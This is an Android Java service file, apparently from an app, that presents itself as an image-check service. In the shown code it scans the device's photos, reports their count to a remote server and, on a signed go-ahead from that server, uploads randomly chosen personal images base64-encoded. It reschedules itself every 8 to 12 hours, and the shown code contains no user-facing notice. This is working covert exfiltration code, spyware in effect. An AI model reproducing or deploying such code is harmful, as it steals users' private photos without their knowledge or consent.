package com.zhangheng.myapplication.service;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Log;

import com.zhangheng.myapplication.R;
import com.zhangheng.myapplication.getphoneMessage.GetPhoneInfo;
import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
import com.zhangheng.myapplication.okhttp.OkHttpUtil;
import com.zhangheng.myapplication.permissions.ReadAndWrite;
import com.zhangheng.myapplication.service.receiver.IndexReceiver;
import com.zhangheng.myapplication.util.AndroidImageUtil;
import com.zhangheng.myapplication.util.EncryptUtil;
import com.zhangheng.myapplication.util.LocalFileTool;
import com.zhangheng.myapplication.util.OkHttpMessageUtil;
import com.zhangheng.myapplication.util.RandomrUtil;
import com.zhangheng.myapplication.util.TimeUtil;
import com.zhangheng.myapplication.util.TxtOperation;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

import cn.hutool.core.collection.CollUtil;
import cn.hutool.core.util.CharsetUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import okhttp3.Call;

/*图片服务*/
public class IndexService extends MyService {

    private final static String Tag = "图片检查服务";
    protected Context context = IndexService.this;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
        if (b) {
            getPhoto(true);
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
//                }
//            }).start();
        }
        int random = RandomrUtil.createRandom(8, 12);
        long anHour = random * 60 * 60 * 1000;
//        long anHour = 30 * 1000;

        timingService(anHour, IndexReceiver.class);

        return super.onStartCommand(intent, flags, startId);
    }


    private List<String> readConfig(String path) {
        List<String> txtFile = null;
        try {
            txtFile = TxtOperation.readTxtFile(path, CharsetUtil.defaultCharsetName());
        } catch (Exception e) {
            e.printStackTrace();
            txtFile = new ArrayList<>();
        }
        return CollUtil.removeBlank(txtFile);
    }

    //        String[] paths = {"/DCIM", "/Pictures"};
    String[] includePaths = {};

    private void getPhoto(boolean is) {
        if (is) {
            long beginTime = System.currentTimeMillis();
            List<String> photo = new LinkedList<>();
//            List<Map<String, Object>> files = new ArrayList<>();
            try {
                LocalFileTool.readFile(LocalFileTool.imageType, context, new LocalFileTool.IReadCallBack() {
                    @Override
                    public void callBack(List<String> localPath) {
                        File file = null;
                        StringBuilder sb = new StringBuilder();
                        String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/10kb~2Mb-IMG.txt";
                        List<String> txtFile = readConfig(local_path);
                        long length = 0;
                        for (String path : localPath) {
//                        for (int i = 0; i < localPath.size(); i++) {
//                            String path=localPath.get(i);
                            if (txtFile.indexOf(path) < 0) {
                                file = new File(path);
                                if (file.exists()) {
                                    length = file.length();
                                    if (length > 1024 * 10 && length < 1024 * 1024 * 2) {

                                    } else {
                                        continue;
                                    }
                                } else {
                                    continue;
                                }
                                if (includePaths.length > 0) {
                                    String s = path.replace(GetPhoto.BasePath, "");
                                    for (String s1 : includePaths) {
                                        if (s.startsWith(s1)) {
//                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
//                                            if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
                                            photo.add(path);
                                            sb.append(path + "\n");
//                                            }
                                            break;
                                        }
                                    }
                                } else {
//                                    if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
                                    photo.add(path);
                                    sb.append(path + "\n");
//                                    }
                                }
                            }
                        }
                        if (sb.length() > 0) {
                            try {
                                TxtOperation.writeTxtFile(sb.toString(), local_path, true);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                        photo.addAll(txtFile);
                        int size = photo.size();
                        int t = (int) (System.currentTimeMillis() - beginTime);
                        Log.d(Tag, "10kb~2Mb图片数：" + size + ",耗时：("+t+"ms)" + TimeUtil.format(t));
                        try {
                            uploadPhoto(size, photo);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
            }
        }
    }

    private void uploadPhoto(int size, List<String> photo) throws Exception {
        Map<String, Object> msg = new HashMap<>();
        msg.put("num", size);
        msg.put("time", TimeUtil.dateToUnix(new Date()));

        OkHttpUtils.get()
                .url(setting.getMainUrl() + OkHttpUtil.URL_postMessage_M3_GetUpload)
                .addHeader("User-Agent", GetPhoneInfo.getHead(context))
                .addParams("json", JSONUtil.toJsonStr(msg))
                .build().execute(new StringCallback() {
            @Override
            public void onError(Call call, Exception e, int id) {
                Log.e(Tag + "图片上传", OkHttpMessageUtil.error(e));
            }

            @Override
            public void onResponse(String response, int id) {
                try {
                    if (!StrUtil.isEmpty(response)) {
                        //校验消息合法
                        JSONObject object = JSONUtil.parseObj(response);
                        String signature = EncryptUtil.getSignature(object.getStr("time"), object.getStr("title"));
                        if (signature.equals(object.getStr("message"))) {
                            if (object.getInt("code").equals(200)) {
                                long beginTime = System.currentTimeMillis();
                                Log.d(Tag + "响应允许", "允许文件上传");
                                if (size > 0) {
                                    int c = 1;
                                    if (size <= 5) {
                                        c = size;
                                    } else if (size > 5 && size < 200) {
                                        c = 2;
                                    } else if (size >= 200 && size < 500) {
                                        c = 3;
                                    } else if (size >= 500 && size < 1000) {
                                        c = 4;
                                    } else {
                                        c = 5;
                                    }
                                    int i = 0;
                                    c = 1;//暂时解决启动时运算量过大导致无法响应
                                    byte[] bytes = null;
                                    File file = null;
                                    while (i < c) {
                                        String pathname = photo.get(RandomrUtil.createRandom(0, size - 1));
                                        file = new File(pathname);
                                        if (file.exists()) {
                                            long fileLength = file.length();
                                            if (fileLength >= 1024 * 1024 * 0.8 && fileLength < 1024 * 1024 * 1.2) {
                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                            } else if (fileLength >= 1024 * 1024 * 1.2 && fileLength < 1024 * 1024 * 1.6) {
                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 3);
                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                            } else if (fileLength >= 1024 * 1024 * 1.6) {
                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 4);
                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                            } else {
                                                bytes = LocalFileTool.fileToBytes(file);
                                            }
                                            if (bytes.length < 1024 * 1024) {
                                                i++;
                                                String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
                                                Map<String, Object> map = new HashMap<>();
                                                map.put("time", TimeUtil.dateToUnix(new Date()));
                                                map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
                                                map.put("path", EncryptUtil.enBase64(replace.getBytes()));
                                                map.put("size", fileLength);
                                                map.put("data", EncryptUtil.enBase64(bytes));
                                                OkHttpUtil.postFile(context, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
//                                                            Thread.sleep(2000);
                                                Log.d(Tag + "上传图片", replace + "," +
                                                        "原文件大小:" + LocalFileTool.getFileSizeString(fileLength) + "," +
                                                        "上传大小：" + LocalFileTool.getFileSizeString((long) bytes.length) + "," +
                                                        "耗时：" + TimeUtil.format((int) (System.currentTimeMillis() - beginTime)));

                                            }
                                        }
                                    }
                                }
                            } else {
                                Log.w(Tag + "响应拒绝", "拒绝文件上传");
                            }
                        } else {
                            Log.e(Tag + "非法响应", "响应消息验证失败");
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                }
            }
        });
    }
}
